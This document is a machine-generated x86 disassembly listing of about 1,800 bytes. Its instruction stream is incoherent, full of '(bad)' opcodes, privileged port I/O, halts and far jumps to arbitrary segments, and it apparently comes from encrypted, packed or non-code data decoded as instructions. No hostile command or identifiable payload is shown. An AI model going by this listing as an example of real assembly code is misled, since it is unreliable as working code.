  412b4a:	sub    eax,0xfa8f5152
  412b4f:	pop    ebx
  412b50:	in     al,0x72
  412b52:	outs   dx,DWORD PTR ds:[esi]
  412b53:	mov    esi,0x57f66cb8
  412b58:	daa    
  412b59:	das    
  412b5a:	fs arpl di,cx
  412b5d:	shl    BYTE PTR [edx],cl
  412b5f:	repnz idiv BYTE PTR [ebx-0x116a77ad]
  412b66:	stos   DWORD PTR es:[edi],eax
  412b67:	xchg   DWORD PTR [edi],edx
  412b69:	add    eax,0x5136bbd5
  412b6e:	xor    BYTE PTR [edi-0x4fffd09a],ch
  412b74:	loope  0x412b61
  412b76:	push   eax
  412b77:	cld    
  412b78:	cmp    BYTE PTR [ebp-0x1b99075b],0x35
  412b7f:	daa    
  412b80:	mov    ch,0xba
  412b82:	stc    
  412b83:	xchg   ebp,eax
  412b84:	(bad)  
  412b85:	jnp    0x412b3f
  412b87:	js     0x412bc9
  412b89:	int    0x9c
  412b8b:	repnz add eax,0x47c64d06
  412b91:	xor    DWORD PTR ds:0x3ff9aebb,edi
  412b97:	xor    DWORD PTR [ecx],edi
  412b99:	mov    DWORD PTR [edx-0x41],esi
  412b9c:	cmovl  ebp,DWORD PTR [ebx+0x406d211c]
  412ba3:	pop    ds
  412ba4:	hlt    
  412ba5:	retf   0x4a46
  412ba8:	fcom   QWORD PTR [ebp-0x3b56a5a1]
  412bae:	(bad)  
  412baf:	dec    esi
  412bb0:	lea    edx,[edi]
  412bb2:	iret   
  412bb3:	js     0x412b46
  412bb5:	inc    edi
  412bb6:	cmp    ebp,DWORD PTR [eax-0x80]
  412bb9:	(bad)  
  412bba:	(bad)  
  412bbc:	mov    ds:0x1bb85a75,eax
  412bc1:	in     al,0x96
  412bc3:	addr16 add dh,ah
  412bc6:	popa   
  412bc7:	fisub  DWORD PTR [esi+0xf8ecfde]
  412bcd:	mov    ebp,0xc231636b
  412bd2:	jge    0x412b91
  412bd4:	loope  0x412c3e
  412bd6:	adc    DWORD PTR [ebp+0xd],0xec7063b0
  412bdd:	xor    eax,0x2ddfc05d
  412be2:	and    eax,0x950fff01
  412be7:	fnstenv [edx+0x1d7db84a]
  412bed:	push   ecx
  412bee:	ret    0x9d5c
  412bf1:	es call 0x3c2:0xb255229c
  412bf9:	stos   DWORD PTR es:[edi],eax
  412bfa:	push   eax
  412bfb:	fstp   QWORD PTR [ebx]
  412bfd:	pushf  
  412bfe:	jmp    0x412b93
  412c00:	jle    0x412bfd
  412c02:	retf   
  412c03:	cli    
  412c04:	mov    al,ds:0x6c9dc850
  412c09:	sub    eax,0x74b4b8ff
  412c0e:	loope  0x412c06
  412c10:	and    eax,0x38d6b2e6
  412c15:	xor    eax,0xf4aeedc7
  412c1a:	sti    
  412c1b:	jo     0x412baa
  412c1d:	sbb    eax,0x25bc2776
  412c22:	repnz inc esi
  412c24:	add    eax,0x6e42fdc2
  412c29:	xlat   BYTE PTR ds:[ebx]
  412c2a:	daa    
  412c2b:	jns    0x412bf0
  412c2d:	mov    dh,dh
  412c2f:	rcl    DWORD PTR [eax],cl
  412c31:	ja     0x412c05
  412c33:	and    BYTE PTR [edx+edx*4-0x4ac58941],al
  412c3a:	scas   eax,DWORD PTR es:[edi]
  412c3b:	adc    bh,BYTE PTR [ebx+ebx*8]
  412c3e:	pusha  
  412c3f:	or     bl,dl
  412c41:	add    esi,DWORD PTR [ebp+esi*2+0x40132d01]
  412c48:	fstp   DWORD PTR [ebx]
  412c4a:	out    0x8e,eax
  412c4c:	mov    eax,0x6facc26d
  412c51:	sub    al,0xd8
  412c53:	cmp    edi,edx
  412c55:	push   ecx
  412c56:	in     eax,0x20
  412c58:	inc    edi
  412c59:	mov    esp,0x7c871d8e
  412c5e:	jbe    0x412c56
  412c60:	adc    eax,0x2122f095
  412c65:	mov    dh,0x28
  412c67:	sar    DWORD PTR [edx-0xe],0x5a
  412c6b:	push   di
  412c6d:	js     0x412c0e
  412c6f:	mov    ecx,0x261d5ad3
  412c74:	dec    ecx
  412c75:	popf   
  412c76:	test   BYTE PTR [esi+edx*4],bh
  412c79:	fisubr WORD PTR [eax+0x75d2d97d]
  412c7f:	adc    DWORD PTR [edx+0x1164e122],esp
  412c85:	int3   
  412c86:	(bad)  
  412c87:	fucomip st,st(1)
  412c89:	dec    ebx
  412c8a:	push   ds
  412c8b:	call   edi
  412c8d:	pusha  
  412c8e:	imul   eax,DWORD PTR [ecx],0xffffffdd
  412c91:	(bad)  
  412c92:	pop    ecx
  412c93:	scas   eax,DWORD PTR es:[edi]
  412c94:	dec    ebx
  412c95:	stos   DWORD PTR es:[edi],eax
  412c96:	std    
  412c97:	stos   BYTE PTR es:[edi],al
  412c98:	sar    BYTE PTR [edx+ecx*4],cl
  412c9b:	(bad)  
  412c9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c9d:	ret    
  412c9e:	std    
  412c9f:	(bad)  gs:[ecx+0x3208ae41]
  412ca6:	xor    al,0x4c
  412ca8:	and    al,0xc5
  412caa:	in     eax,0xea
  412cac:	hlt    
  412cad:	sbb    ah,al
  412caf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cb0:	mov    dh,0x12
  412cb2:	mov    al,BYTE PTR [edi+0x30]
  412cb5:	fwait
  412cb6:	sbb    BYTE PTR [edx-0x415c0cc6],dh
  412cbc:	test   eax,0x536cca3e
  412cc1:	inc    eax
  412cc2:	mov    dh,0xe7
  412cc4:	pop    edi
  412cc5:	mov    WORD PTR ds:0x35f0fa4a,ds
  412ccb:	pop    edi
  412ccc:	cmp    esi,edi
  412cce:	or     esi,DWORD PTR [ecx]
  412cd0:	xor    DWORD PTR [ebx-0x3e],0x8af94e9f
  412cd7:	rcl    DWORD PTR [edx-0x665ed54d],0xd4
  412cde:	push   esp
  412cdf:	ficom  DWORD PTR [ebx-0x29f74aa4]
  412ce5:	call   0xcf41:0x29cb7bcf
  412cec:	pusha  
  412ced:	mov    BYTE PTR [ebp-0x31],dl
  412cf0:	aad    0xb
  412cf2:	imul   DWORD PTR [edi+0x41]
  412cf5:	pop    ds
  412cf6:	adc    edi,eax
  412cf8:	inc    eax
  412cf9:	imul   esp,DWORD PTR [edx-0x79c0b446],0x11
  412d00:	loopne 0x412d14
  412d02:	(bad)  
  412d03:	pop    esi
  412d04:	mov    bh,0x60
  412d06:	and    BYTE PTR [edi],al
  412d08:	loope  0x412c8f
  412d0a:	xor    DWORD PTR [eax],ebp
  412d0c:	cmp    BYTE PTR ds:0xbd3985a2,ch
  412d12:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d14:	inc    ebx
  412d15:	outs   dx,BYTE PTR ds:[esi]
  412d16:	ss (bad) 
  412d18:	mov    ebx,0x9794da0b
  412d1d:	bound  edi,QWORD PTR [ecx+0xa]
  412d20:	fwait
  412d21:	and    DWORD PTR [ecx],edx
  412d23:	push   ecx
  412d24:	fdiv   DWORD PTR [ebp+ebp*8+0x8]
  412d28:	sar    dh,0x17
  412d2b:	cmp    al,0x55
  412d2d:	cmp    al,BYTE PTR [eax+0x4c256c53]
  412d33:	xor    ch,ch
  412d35:	xlat   BYTE PTR ds:[ebx]
  412d36:	xchg   esi,eax
  412d37:	cdq    
  412d38:	add    eax,0xc56d1f9e
  412d3d:	(bad)  
  412d41:	jl     0x412dad
  412d43:	inc    esi
  412d44:	sahf   
  412d45:	mov    bh,0x13
  412d47:	sbb    al,0xbf
  412d49:	jl     0x412d9f
  412d4b:	xchg   ebp,eax
  412d4c:	aam    0xc1
  412d4e:	push   es
  412d4f:	shr    dh,1
  412d51:	cld    
  412d52:	push   es
  412d53:	sub    DWORD PTR [edi-0x44c853e8],0xfffffff4
  412d5a:	push   edi
  412d5b:	popa   
  412d5c:	scas   al,BYTE PTR es:[edi]
  412d5d:	enter  0x86fd,0xce
  412d61:	pop    edx
  412d62:	repnz daa 
  412d64:	addr16 push esp
  412d66:	bound  edi,QWORD PTR [esi+edx*4-0x77]
  412d6a:	out    0x57,al
  412d6c:	xchg   esi,eax
  412d6d:	pop    ebx
  412d6e:	push   0xffffff80
  412d70:	stos   BYTE PTR es:[edi],al
  412d71:	xchg   ebp,eax
  412d72:	fild   DWORD PTR [edi-0x12b21d12]
  412d78:	or     ebx,DWORD PTR [eax]
  412d7a:	aam    0x6a
  412d7c:	lock ja 0x412d06
  412d7f:	dec    esi
  412d80:	test   BYTE PTR [esi+0x58ff4dd4],al
  412d86:	shr    DWORD PTR ss:[edx-0xf],cl
  412d8a:	sub    al,0x56
  412d8c:	push   0x43
  412d8e:	inc    edi
  412d8f:	push   ecx
  412d90:	xor    BYTE PTR [edi+0x9],bh
  412d93:	dec    eax
  412d94:	jl     0x412d90
  412d96:	lods   al,BYTE PTR ds:[esi]
  412d97:	mov    esi,0x6116b2cf
  412d9c:	iret   
  412d9d:	xchg   ecx,eax
  412d9e:	jmp    0x1e85:0xbda202d3
  412da5:	(bad)  
  412da7:	in     eax,0x1c
  412da9:	ja     0x412d71
  412dab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dac:	std    
  412dad:	or     al,0xd6
  412daf:	jp     0x412e17
  412db1:	ret    
  412db2:	or     eax,0x9ed5be55
  412db7:	and    bl,dl
  412db9:	or     ebp,DWORD PTR [eax+0x5207c86a]
  412dbf:	ja     0x412dab
  412dc1:	push   esi
  412dc2:	ja     0x412d53
  412dc4:	shl    BYTE PTR [ebx+0x29],cl
  412dc7:	or     eax,0x48310ce6
  412dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dcd:	(bad)  
  412dce:	in     al,dx
  412dcf:	arpl   di,si
  412dd1:	mov    al,ds:0x30051f92
  412dd6:	ficomp WORD PTR [esi+ecx*4+0x55fb4f4a]
  412ddd:	ins    BYTE PTR es:[edi],dx
  412dde:	inc    esi
  412ddf:	or     ah,BYTE PTR [edi+0x16]
  412de2:	iret   
  412de3:	ds iret 
  412de5:	rcr    DWORD PTR [eax-0x6],0xe8
  412de9:	out    dx,eax
  412dea:	mov    ds:0xadb7c1a,al
  412def:	test   DWORD PTR [eax+ebp*2-0x6d],edi
  412df3:	lds    ecx,FWORD PTR [edi]
  412df5:	into   
  412df6:	sub    al,0xb5
  412df8:	push   ebx
  412df9:	call   0x475f9517
  412dfe:	lods   al,BYTE PTR ds:[esi]
  412dff:	cld    
  412e00:	call   0x3603:0x81f3c3a0
  412e07:	adc    dl,BYTE PTR ss:[eax]
  412e0a:	retf   
  412e0b:	nop    ebx
  412e0e:	retf   0x6695
  412e11:	pop    ss
  412e12:	push   0xfffffffe
  412e14:	or     esp,DWORD PTR [esi]
  412e16:	jle    0x412dc8
  412e18:	cmp    dh,dl
  412e1a:	fst    QWORD PTR [edi+eiz*8]
  412e1d:	pop    ebp
  412e1e:	(bad)
  412e22:	idiv   DWORD PTR [ecx-0x36]
  412e25:	xchg   ebp,eax
  412e26:	pop    ss
  412e27:	bound  edx,QWORD PTR [edi+0x42c3df5a]
  412e2d:	add    bh,BYTE PTR [esi-0xe]
  412e30:	rcl    DWORD PTR [edx+0x19],0xa4
  412e34:	or     dh,dl
  412e36:	(bad)  
  412e38:	(bad)  
  412e39:	loope  0x412e4d
  412e3b:	ins    BYTE PTR es:[edi],dx
  412e3c:	dec    esi
  412e3d:	add    DWORD PTR [esi-0x41d8ae6],eax
  412e43:	fstp   TBYTE PTR [ebx+ebp*8]
  412e46:	xlat   BYTE PTR ds:[ebx]
  412e47:	mov    al,ds:0x9c1a7aca
  412e4c:	pop    ebp
  412e4d:	adc    al,BYTE PTR [esi+0x721575cb]
  412e53:	rcl    BYTE PTR [edx+0x60dd10d5],0xc9
  412e5a:	ror    DWORD PTR [eax+edi*4+0x147dccb6],cl
  412e61:	lods   eax,DWORD PTR ds:[esi]
  412e62:	lock (bad) 
  412e64:	dec    ebx
  412e65:	in     al,0x99
  412e67:	loope  0x412e87
  412e69:	jmp    0x31d4529a
  412e6e:	adc    cl,BYTE PTR [edx+ebp*2+0x75]
  412e72:	xchg   ecx,eax
  412e73:	mov    ebp,0x5a4f3ce
  412e78:	cmp    eax,0x98fb8b57
  412e7d:	fcom   DWORD PTR [edx]
  412e7f:	xor    esi,esp
  412e81:	out    dx,al
  412e82:	shl    BYTE PTR [ebx+0x346f20eb],0x17
  412e89:	xor    eax,0x1c634504
  412e8e:	inc    ecx
  412e8f:	enter  0x5082,0xa3
  412e93:	cmp    eax,0x6fe66071
  412e98:	in     al,0x3e
  412e9a:	mov    bl,0x45
  412e9c:	je     0x412e76
  412e9e:	hlt    
  412e9f:	fdiv   DWORD PTR [edi+0xdaa05c3]
  412ea5:	xchg   edx,eax
  412ea6:	sti    
  412ea7:	mov    cl,0xa0
  412ea9:	push   esi
  412eaa:	out    0xd1,al
  412eac:	sbb    BYTE PTR [ebx-0x1df9f753],0x1b
  412eb3:	add    DWORD PTR [edi+0x5a],esi
  412eb6:	imul   esi,DWORD PTR [edi+0x771894f4],0xffffffda
  412ebd:	mov    ebx,0x5d4d4d17
  412ec2:	das    
  412ec3:	push   eax
  412ec4:	scas   eax,DWORD PTR es:[edi]
  412ec5:	xchg   esp,eax
  412ec6:	xchg   ebp,eax
  412ec7:	and    eax,0xb264bf8a
  412ecc:	push   es
  412ecd:	out    0x2d,al
  412ecf:	mov    esp,0x9f8a4998
  412ed4:	xchg   edx,eax
  412ed5:	movhps QWORD PTR [edi],xmm2
  412ed8:	jge    0x412eeb
  412eda:	leave  
  412edb:	stos   DWORD PTR es:[edi],eax
  412edc:	xor    bh,BYTE PTR [edi-0x2f9040a4]
  412ee2:	in     al,dx
  412ee3:	jmp    0x412ede
  412ee5:	mov    ds:0xbeb3f687,eax
  412eea:	addr16 mov eax,ds:0x804c
  412eee:	sbb    esp,DWORD PTR [ebx]
  412ef0:	nop
  412ef1:	push   cs
  412ef2:	scas   eax,DWORD PTR es:[edi]
  412ef3:	ds push ecx
  412ef5:	push   ecx
  412ef6:	jmp    0x6352a2fd
  412efb:	outs   dx,BYTE PTR ds:[esi]
  412efc:	fisttp QWORD PTR [esi]
  412efe:	sbb    DWORD PTR [ebx+0x23],0xc14bbd7f
  412f05:	xchg   ebp,eax
  412f06:	sub    eax,0xeaebf79
  412f0b:	dec    ecx
  412f0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f0d:	mov    ecx,0x95be6361
  412f12:	mov    cl,0x9c
  412f14:	mov    ds:0x15cb2129,al
  412f19:	cs pop edx
  412f1b:	mov    ebx,0x401cf94a
  412f20:	dec    edx
  412f21:	fnsave [edi-0x2f]
  412f24:	jle    0x412eb5
  412f26:	mov    edx,0x9c80547
  412f2b:	jge    0x412f2b
  412f2d:	aaa    
  412f2e:	dec    edx
  412f2f:	jno    0x412ef1
  412f31:	xor    al,0xcb
  412f33:	out    dx,al
  412f34:	xchg   BYTE PTR [edx+eiz*2+0x2d],al
  412f38:	adc    BYTE PTR [ebx],al
  412f3a:	and    DWORD PTR [ebp+0x1535f67d],0x44
  412f41:	mov    eax,0xb527f7af
  412f46:	dec    ebx
  412f47:	mov    ebx,DWORD PTR [edi-0x78]
  412f4a:	stos   BYTE PTR es:[edi],al
  412f4b:	(bad)  
  412f4c:	leave  
  412f4d:	pop    eax
  412f4e:	and    ebp,ebp
  412f50:	jo     0x412f2a
  412f52:	mov    eax,ds:0x10fcfc8b
  412f57:	cmp    al,0xc7
  412f59:	cmp    bl,BYTE PTR [ebp+0x21]
  412f5c:	push   cs
  412f5d:	fsubrp st(2),st
  412f5f:	loope  0x412f72
  412f61:	cmp    bh,BYTE PTR [ebx+0x2d1b6614]
  412f67:	fcmovbe st,st(1)
  412f69:	pop    edx
  412f6a:	mov    dh,0x1f
  412f6c:	jle    0x412f2e
  412f6e:	shr    BYTE PTR [eax+0x73],cl
  412f71:	cld    
  412f72:	adc    eax,0xa655d071
  412f77:	sti    
  412f78:	cmp    esi,DWORD PTR [esp+ebp*4+0x55d4cab7]
  412f7f:	sub    DWORD PTR [edx+0x3f],ebp
  412f82:	sbb    ah,cl
  412f84:	inc    esp
  412f85:	nop
  412f86:	sub    al,0x7d
  412f88:	repnz das 
  412f8a:	test   eax,0x66d421ac
  412f8f:	jmp    0xa35:0xa76ac292
  412f96:	int3   
  412f97:	push   cs
  412f98:	int    0x59
  412f9a:	xchg   esp,eax
  412f9b:	leave  
  412f9c:	and    DWORD PTR [ebp-0x38548711],edi
  412fa2:	jecxz  0x413005
  412fa4:	xchg   ah,al
  412fa6:	test   DWORD PTR [ecx-0x3b71699a],eax
  412fac:	inc    edi
  412fad:	bound  esp,QWORD PTR [esi]
  412faf:	popa   
  412fb0:	xor    BYTE PTR [edi+0x63],bh
  412fb3:	dec    eax
  412fb4:	sub    al,0xd1
  412fb6:	jae    0x413030
  412fb8:	js     0x412f8d
  412fba:	repz and eax,DWORD PTR [ebp-0x27]
  412fbe:	repz das 
  412fc0:	call   0xee701b48
  412fc5:	(bad)  
  412fc6:	sbb    bl,BYTE PTR [edi-0x6f]
  412fc9:	cld    
  412fca:	mov    eax,ds:0xa49e5c5c
  412fcf:	or     ebp,edx
  412fd1:	xor    dl,dh
  412fd3:	jo     0x413028
  412fd5:	test   BYTE PTR [ecx-0x4be62710],ah
  412fdb:	fdivrp st(7),st
  412fdd:	pop    esp
  412fde:	or     esi,edx
  412fe0:	xor    al,BYTE PTR [ecx+ebx*4]
  412fe3:	test   eax,0xfb5d13c0
  412fe8:	inc    ecx
  412fe9:	out    dx,eax
  412fea:	add    al,0x38
  412fec:	dec    ebx
  412fed:	and    al,0xea
  412ff0:	mov    ecx,0x96593576
  412ff5:	ja     0x41301d
  412ff7:	mov    ebp,0x43f5e1ef
  412ffc:	in     eax,0xa7
  412ffe:	out    0xc0,eax
  413000:	repz sub ecx,DWORD PTR [esi+ebx*4]
  413004:	sar    DWORD PTR ds:0x8ebc1658,0x53
  41300b:	in     eax,0x20
  41300d:	push   eax
  41300e:	ficom  DWORD PTR [eax+0x1d4ff392]
  413014:	adc    al,0xc7
  413016:	imul   esi,DWORD PTR [ebp-0xc],0xe1225b16
  41301d:	leave  
  41301e:	(bad)  
  41301f:	cdq    
  413020:	mov    edi,ss
  413022:	xchg   esi,eax
  413023:	cld    
  413024:	call   FWORD PTR [edx+edx*8-0x769e0f71]
  41302b:	jnp    0x413030
  41302d:	cmp    al,0xc
  41302f:	test   BYTE PTR [ecx-0x7a],ch
  413032:	loop   0x412fc8
  413034:	or     dh,bl
  413036:	jne    0x41301e
  413038:	xchg   ebp,eax
  413039:	inc    ebp
  41303a:	xchg   esp,eax
  41303b:	push   esp
  41303c:	mov    eax,0xd84a8a14
  413041:	xchg   edx,eax
  413042:	add    eax,0xd514c511
  413047:	jae    0x41301a
  413049:	cmp    dl,BYTE PTR [ecx-0x3]
  41304c:	ja     0x413099
  41304e:	stos   BYTE PTR es:[edi],al
  41304f:	mov    esp,0xf131009
  413054:	push   eax
  413055:	enter  0x3d6d,0x11
  413059:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41305a:	add    ah,BYTE PTR cs:[eax]
  41305d:	icebp  
  41305e:	jmp    0xc28:0x565bd903
  413065:	xchg   ebx,eax
  413066:	stos   DWORD PTR es:[edi],eax
  413067:	fcom   DWORD PTR [edx+eax*8+0x62e0bd46]
  41306e:	mov    DWORD PTR [eax],eax
  413070:	pop    ebp
  413071:	inc    ebp
  413072:	jp     0x413091
  413074:	push   cs
  413075:	dec    esp
  413076:	adc    eax,DWORD PTR [ebx-0x358013f4]
  41307c:	jae    0x4130e1
  41307e:	cmp    al,0x86
  413080:	cmp    bl,ah
  413082:	add    DWORD PTR [esi-0x3c46b9cd],edx
  413088:	lock xchg esi,eax
  41308a:	cwde   
  41308b:	(bad)  
  41308c:	shl    BYTE PTR [ebp-0x5d],0xda
  413090:	cmp    edi,edi
  413092:	mov    al,0x97
  413094:	jns    0x41305c
  413096:	cli    
  413097:	jnp    0x41304a
  413099:	mov    dl,0xe6
  41309b:	push   0x41a572a6
  4130a0:	pop    es
  4130a1:	cwde   
  4130a2:	or     esi,DWORD PTR [esi-0x8]
  4130a5:	outs   dx,DWORD PTR ds:[esi]
  4130a6:	test   al,0x88
  4130a8:	vmwrite edi,DWORD PTR ds:0xf9d4ce8
  4130af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130b0:	call   0x7ae66d1d
  4130b5:	les    ecx,FWORD PTR [esi-0x23]
  4130b8:	int3   
  4130b9:	mov    DWORD PTR [esi+0x48],eax
  4130bc:	imul   edx,esi,0x909c1964
  4130c2:	jbe    0x413082
  4130c4:	into   
  4130c5:	lock and ah,BYTE PTR [ecx]
  4130c8:	mov    bl,0x7c
  4130ca:	mov    dl,0x64
  4130cc:	dec    ecx
  4130cd:	xor    esp,DWORD PTR [edi-0x42322afa]
  4130d3:	sbb    edi,edx
  4130d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130d7:	scas   al,BYTE PTR es:[edi]
  4130d8:	dec    ecx
  4130d9:	repnz nop
  4130db:	adc    eax,0xb4bdf88e
  4130e0:	add    BYTE PTR [ebx],bl
  4130e2:	mov    dh,0xb8
  4130e4:	jl     0x413114
  4130e6:	test   DWORD PTR [ebx+0x2],esi
  4130e9:	loop   0x4130dc
  4130eb:	xor    al,bl
  4130ed:	sub    bh,bl
  4130ef:	or     ah,ch
  4130f1:	jge    0x413092
  4130f3:	aaa    
  4130f4:	call   0x526c65b4
  4130f9:	sbb    DWORD PTR [edi],eax
  4130fb:	sar    DWORD PTR [esi],cl
  4130fd:	out    dx,al
  4130fe:	rol    BYTE PTR [ecx-0x24],cl
  413101:	push   edx
  413102:	add    dl,BYTE PTR [ecx]
  413104:	pusha  
  413105:	test   edi,ebp
  413107:	jg     0x41316e
  413109:	add    eax,eax
  41310b:	fcom   st(1)
  41310d:	and    cl,BYTE PTR [esi-0x1f2dc693]
  413113:	div    BYTE PTR ds:0x5290b05a
  413119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41311a:	lea    ecx,[ebp+0x28]
  41311d:	fnstenv [eax+0x68c2f466]
  413123:	push   ss
  413124:	mov    al,0x75
  413126:	xlat   BYTE PTR ds:[ebx]
  413127:	je     0x413113
  413129:	mov    BYTE PTR [edi-0x2d],bl
  41312c:	pop    ebx
  41312d:	adc    eax,0xa3dca0fb
  413132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413133:	pop    ss
  413134:	into   
  413135:	fist   DWORD PTR [ebp+0x3eda7048]
  41313b:	inc    ecx
  41313c:	stc    
  41313d:	mov    esi,0x59fc7233
  413142:	ret    
  413143:	mov    dl,0x8c
  413145:	in     al,0x98
  413147:	dec    edx
  413148:	mov    ah,0x48
  41314a:	leave  
  41314b:	mov    cl,0x21
  41314d:	jbe    0x413174
  41314f:	or     eax,0xa64d0e96
  413154:	inc    esp
  413155:	(bad)  
  413156:	sbb    al,0xd4
  413158:	jmp    0xe88d3504
  41315d:	push   ebx
  41315e:	jne    0x4131bc
  413160:	int3   
  413161:	or     BYTE PTR [edx+0x71],al
  413164:	scas   al,BYTE PTR es:[edi]
  413165:	adc    al,0x76
  413167:	xchg   ebx,eax
  413168:	dec    ebp
  413169:	add    al,0x37
  41316b:	pop    ecx
  41316c:	inc    ebp
  41316d:	xor    esi,DWORD PTR [eax]
  41316f:	or     bl,bh
  413171:	xor    al,0x86
  413173:	test   eax,0xcc55a505
  413178:	ja     0x4131f8
  41317a:	test   BYTE PTR ds:0x4bcd07ec,ah
  413180:	sub    eax,0xe813935f
  413186:	or     BYTE PTR [ebx],dl
  413188:	retf   0x399a
  41318b:	pop    edi
  41318c:	mov    WORD PTR [edi-0x3fb160ec],?
  413192:	jns    0x41313c
  413194:	inc    eax
  413195:	mov    al,ds:0xf5779ffb
  41319a:	mov    ah,0x9f
  41319c:	jg     0x413141
  41319e:	fist   WORD PTR [edi]
  4131a0:	xchg   edi,eax
  4131a1:	inc    eax
  4131a2:	pusha  
  4131a3:	out    0xb6,eax
  4131a5:	test   al,0xac
  4131a7:	inc    ebx
  4131a8:	into   
  4131a9:	dec    esp
  4131aa:	pop    edi
  4131ab:	mov    eax,0x35f204a5
  4131b0:	cs xor eax,0x1a8b847d
  4131b6:	sub    eax,0xc32b1f68
  4131bb:	xchg   ecx,eax
  4131bc:	retf   
  4131bd:	shr    DWORD PTR [esi-0x31],cl
  4131c0:	fstp   QWORD PTR [eax+0xa]
  4131c3:	out    0xcb,eax
  4131c5:	mov    ds:0x5c3794fd,eax
  4131ca:	sbb    al,0x59
  4131cc:	or     al,0x74
  4131ce:	rcl    DWORD PTR [edx+0x1c62ab93],1
  4131d4:	icebp  
  4131d5:	or     bh,BYTE PTR [ebp+ebx*8-0x21d9fe45]
  4131dc:	inc    edx
  4131dd:	pushf  
  4131de:	std    
  4131df:	loopne 0x41316a
  4131e1:	pop    ebp
  4131e2:	or     eax,0xd57b415f
  4131e7:	mov    bh,0x83
  4131e9:	mov    eax,ds:0x11ec6913
  4131ee:	adc    bh,BYTE PTR [eiz*1-0x9a73c8d]
  4131f5:	dec    edi
  4131f6:	push   cs
  4131f7:	arpl   WORD PTR [esi],sp
  4131f9:	xor    al,0x9b
  4131fb:	ds and al,0x72
  4131fe:	mov    eax,0x2efbb7fa
  413203:	addr16 ret 
  413205:	cld    
  413206:	xchg   ecx,eax
  413207:	sub    ch,BYTE PTR [ebp+ebp*8-0x73]
  41320b:	call   0x8cec8ace
  413210:	dec    esp
  413211:	or     BYTE PTR fs:[esi-0x1a],0xd1
  413216:	or     edi,DWORD PTR [eax-0x463e74c]
  41321c:	sbb    ah,ch
  41321e:	or     bh,bl
  413220:	cld    
  413221:	cmp    bl,BYTE PTR [ecx]
  413223:	inc    esp
  413224:	pusha  
  413225:	nop
  413226:	aam    0x3c
  413228:	pop    ss
  413229:	bound  ecx,QWORD PTR [bx+di-0x6c]
  41322d:	(bad)  
  41322e:	loope  0x4132ac
  413230:	dec    esp
  413231:	fnstenv [ebp+0x5c80d880]
  413237:	out    0x4e,eax
  413239:	dec    esp
  41323a:	xchg   DWORD PTR [ecx+0x14],eax
  41323d:	popa   
  41323e:	push   ebx
  41323f:	ja     0x4131eb
  413241:	pusha  
  413242:	sahf   
  413243:	xor    eax,0xbac02a53
  413248:	fst    DWORD PTR [edi-0x32]
  41324b:	sub    edx,DWORD PTR [edx+0x57]
  41324e:	xor    DWORD PTR ds:0x283f097e,ebp
  413254:	inc    eax
  413255:	cmp    ecx,DWORD PTR [ebp-0x323e15dc]
  41325b:	inc    edi
  41325c:	xchg   ebx,eax
  41325d:	push   0x75
  41325f:	iret   
  413260:	lock ficomp DWORD PTR ds:0x288509cf
  413267:	or     esi,DWORD PTR [edx-0x10]
  41326a:	push   edx
  41326b:	inc    ebx
  41326c:	sbb    BYTE PTR [edi+ebx*4-0x3f],0xc1
  413271:	lahf   
  413272:	add    al,0xae
  413274:	les    ebx,FWORD PTR [edx]
  413276:	test   BYTE PTR [ebp+ebx*2+0x47],cl
  41327a:	lods   al,BYTE PTR ds:[esi]
  41327b:	in     eax,dx
  41327c:	mov    ecx,0xb3b6806e
  413281:	add    BYTE PTR [ebp+0x2e],ch
  413284:	push   ss
  413285:	stos   DWORD PTR es:[edi],eax
  413286:	push   ecx
  413287:	aas    
  413288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413289:	cwde   
  41328a:	enter  0x6b27,0x3b
  41328e:	ss push 0xe152d7a1
  413294:	neg    esi
  413296:	jb     0x413225
  413298:	xchg   edx,eax
  413299:	es clc 
  41329b:	das    
  41329c:	imul   eax
  41329e:	fild   WORD PTR [esi-0x4a]
  4132a1:	lock (bad) 
  4132a3:	test   al,0x10
  4132a5:	ds mov ebp,0x59ac478b
  4132ab:	jno    0x4132df
  4132ad:	std    
  4132ae:	(bad)  
  4132af:	in     al,dx
  4132b0:	repnz es xchg ebp,esp
  4132b4:	cli    
  4132b5:	mov    eax,0x72423e82
  4132ba:	leave  
  4132bb:	push   ebp
  4132bc:	push   0x3f9d25da
  4132c1:	jl     0x41326e
  4132c3:	add    al,0x9f
  4132c5:	push   ds
  4132c6:	jmp    0x4132e2
  4132c8:	loopne 0x4132fe
  4132ca:	and    DWORD PTR [edi+0x5caac11d],ebp
  4132d0:	(bad)  [esi]
  4132d2:	dec    ecx
  4132d3:	test   BYTE PTR [ebx+0x1d],0x5f
  4132d7:	xor    bh,dl
  4132d9:	repz mov eax,ds:0xb638a0c7
  4132df:	out    dx,eax
  4132e0:	cmp    al,0x69
  4132e2:	in     eax,dx
  4132e3:	jmp    0x413326
  4132e5:	pushf  
  4132e6:	mov    al,0x67
  4132e8:	xchg   edx,eax
  4132ea:	test   dh,bl
  4132ec:	sti    
  4132ed:	rol    DWORD PTR [edx],1
  4132ef:	daa    
  4132f0:	xchg   DWORD PTR [edx-0x56],esi
  4132f3:	mov    edx,0x67192568
  4132f8:	inc    ebp
  4132f9:	mov    ah,0x9
  4132fb:	loopne 0x413369
  4132fd:	ffree  st(3)
  4132ff:	mov    eax,0x40ae9002
  413304:	xor    bh,dl
  413306:	test   eax,0x60bacbd4
  41330b:	push   ds
  41330c:	popa   
  41330d:	push   0x4b
  41330f:	(bad)  
  413310:	mov    ds:0x2f0ce656,al
  413315:	add    al,0x22
  413317:	mov    dl,0xae
  413319:	adc    al,0x55
  41331b:	jns    0x4132df
  41331d:	push   0xfa5dae79
  413322:	jnp    0x413393
  413324:	add    DWORD PTR [edi],ebp
  413326:	xor    BYTE PTR [eax+edi*4+0x6],0x3b
  41332b:	mov    ch,BYTE PTR [ebp+0x27b7260]
  413331:	xchg   BYTE PTR [ebp-0x62],cl
